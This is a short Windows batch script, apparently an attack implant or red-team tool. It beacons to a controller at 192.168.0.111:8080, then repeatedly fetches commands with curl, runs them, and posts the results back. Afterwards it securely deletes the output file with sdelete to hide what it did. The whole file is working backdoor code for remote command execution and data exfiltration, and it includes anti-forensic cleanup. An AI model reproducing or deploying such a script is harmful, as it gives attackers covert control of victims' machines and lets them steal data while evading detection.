@echo off

SET /A INDEX=1
SET /A COUNT=5
SET preq="0"

:BEACON
IF %INDEX% LEQ %COUNT% (
	%TEMP%\psping64.exe /accepteula -n 1 -i 0 192.168.0.111:8080 | findstr /C:"Received = 1" > NUL && (GOTO:WHILE)
	timeout /t 2 /nobreak > NUL
	timeout /t 120 /nobreak > NUL
	SET /A "INDEX=%INDEX%+1"
	GOTO:BEACON 
) ELSE (
	taskkill /F /IM cmd.exe
)


:WHILE
FOR /F "delims=" %%i IN ('curl -X GET http://192.168.0.111:8080') DO set command=%%i
CALL %command% > %TEMP%\out
curl -X POST --data-binary @%TEMP%\out http://192.168.0.111:8080
echo > %TEMP%\out
%TEMP%\sdelete64.exe -p 2 /accepteula %TEMP%\out
timeout /t 5 /nobreak >NUL
GOTO:WHILE

%TEMP%\sdelete64.exe -p 5 /accepteula %TEMP%\out
taskkill /F /IM cmd.exe

